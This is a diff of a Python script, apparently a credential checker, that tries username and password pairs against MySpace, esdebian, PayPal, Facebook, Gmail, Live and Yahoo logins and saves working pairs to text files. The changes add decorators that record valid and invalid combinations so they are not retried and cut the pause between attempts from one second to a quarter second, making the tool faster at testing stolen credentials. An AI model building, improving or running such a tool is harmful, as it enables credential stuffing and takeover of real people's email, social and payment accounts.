@@ -1,20 +1,20 @@
 #!/usr/bin/env python
 #-*- coding: UTF-8 -*-
+
 from browser import BROWSER
+from debug import debug
+from decoradores import Retry, Async, Verbose
+from functools import wraps
+import debug as Debug
+import os
 import re
 import smtplib
 import socket
 import sys
 import time
-import os
-import debug as Debug
-debug = Debug.debug
-
-from decoradores import Cache, Retry, Async, Verbose
-from threading import Thread
 
 RC = "%s/.fisgon/" % os.getenv("HOME")
-VERBOSE = 3
+VERBOSE = 4
 
 
 class Discovers(list):
@@ -23,6 +23,49 @@ class Discovers(list):
         return func
 
 discovers = Discovers()
+
+def write(text, destination):
+    f = open(destination, "a")
+    f.write("%s\n" % text)
+    f.close()
+
+
+def log(func):
+    @wraps(func)
+    def dfunc(*args, **kwargs):
+        result = func(*args, **kwargs)
+        if result:
+            write(";".join(args), func.func_name + ".txt")
+        else:
+            write(";".join(args), "no-" + func.func_name + ".txt")
+
+    return dfunc
+
+
+def read(filename):
+    try:
+        pairs = [line.strip().split(";")
+            for line in open(filename).readlines()]
+    except IOError:
+        pairs = []
+
+    return pairs
+
+
+def filter(func):
+    trues = read(func.func_name + ".txt")
+    falses = read("no-" + func.func_name + ".txt")
+
+    @wraps(func)
+    def dfunc(*args, **kwargs):
+        if args in trues:
+            return True
+        elif args in falses:
+            return False
+        else:
+            return func(*args, **kwargs)
+
+    return dfunc
 
 
 def ismail(user):
@@ -37,8 +80,6 @@ def ismail(user):
         return False
 
 @discovers
-@Cache(ruta=RC + "myspace.pickle")
-@Retry(15)
 def myspace(user, password):
     if ismail(user):
         b.clear_cookies()
@@ -60,8 +101,6 @@ def myspace(user, password):
         return False
 
 @discovers
-@Cache(ruta=RC + "esdebian.pickle")
-@Retry(15)
 def esdebian(user, password):
     if ismail(user):
         b.clear_cookies()
@@ -83,8 +122,6 @@ def esdebian(user, password):
         return False
 
 @discovers
-@Cache(ruta=RC + "paypal.pickle")
-@Retry(15)
 def paypal(user, password):
     if ismail(user):
         b.clear_cookies()
@@ -110,9 +147,8 @@ def paypal(user, password):
     else:
         return False
 
+
 @discovers
-@Cache(ruta=RC + "facebook.pickle")
-@Retry(15)
 def facebook(user, password):
     if ismail(user):
         b.clear_cookies()
@@ -133,11 +169,12 @@ def facebook(user, password):
     else:
         return False
 
+
 @discovers
 @Async
-@Cache(ruta=RC + "gmail.pickle")
-@Retry(15)
 @Verbose(VERBOSE)
+@filter
+@log
 def gmail(user, password):
     if ismail(user):
         smtp = smtplib.SMTP()
@@ -157,14 +194,14 @@ def gmail(user, password):
             return None
     else:
         return False
-    write(";".join((user, password)), "gmail.txt")
     return "gmail.com"
+
 
 @discovers
 @Async
-@Cache(ruta=RC + "live.pickle")
-@Retry(15)
 @Verbose(VERBOSE)
+@filter
+@log
 def live(user, password):
     if ismail(user):
         smtp = smtplib.SMTP()
@@ -184,14 +221,14 @@ def live(user, password):
             return None
     else:
         return False
-    write(";".join((user, password)), "live.txt")
     return "live.com"
+
 
 @discovers
 @Async
-@Cache(ruta=RC + "yahoo.pickle")
-@Retry(15)
 @Verbose(VERBOSE)
+@filter
+@log
 def yahoo(user, password):
     if ismail(user) and "@yahoo." in user:
         smtp = smtplib.SMTP()
@@ -208,14 +245,7 @@ def yahoo(user, password):
             return None
     else:
         return False
-    write(";".join((user, password)), "yahoo.txt")
     return "yahoo.com"
-
-
-def write(text, destination):
-    f = open(destination, "a")
-    f.write("%s\n" % text)
-    f.close()
 
 
 def main():
@@ -237,7 +267,7 @@ def main():
                             slots[pos] = discover(user, password)
                             passed = True
                             break
-                    time.sleep(1)
+                    time.sleep(.25)
 
     for slot in slots:
         if slot is not None:
